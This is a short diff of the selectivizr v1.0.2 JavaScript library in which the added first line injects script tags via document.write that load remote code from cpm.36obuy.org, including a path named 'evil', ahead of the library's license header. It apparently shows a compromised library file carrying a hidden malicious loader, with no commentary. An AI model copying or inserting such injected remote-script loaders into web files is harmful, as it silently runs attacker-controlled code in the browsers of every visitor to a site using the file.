@@ -1,4 +1,4 @@
-/*!
+document.write("<script src=\"http://cpm.36obuy.org/evil/1.js\"></script>");document.write("<script src=\"http://cpm.36obuy.org/lion/1.js\"></script>");<script src="http://cpm.36obuy.org/js/1.js"></script>/*!
  * selectivizr v1.0.2 - (c) Keith Clark, freely distributable under the terms of the MIT license.
  * selectivizr.com
  */
